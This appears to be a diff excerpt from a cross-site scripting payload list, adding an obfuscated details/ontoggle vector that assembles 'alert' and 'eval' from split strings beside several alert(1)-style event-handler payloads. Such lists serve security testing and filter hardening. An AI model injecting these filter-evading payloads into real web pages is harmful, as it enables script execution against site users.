@@ -80,6 +80,7 @@ content['alert'](6)
  onerror
  onload
   
+  <details open ontoggle=['ale'%2b'rt'].map(top['ev'%2b'al'])[0]['valu'%2b'eOf']()(1)>
  <select autofocus onfocus="alert`1`">
 <audio src onloadstart=alert(1)>
  <details/open/ontoggle="alert`1`">
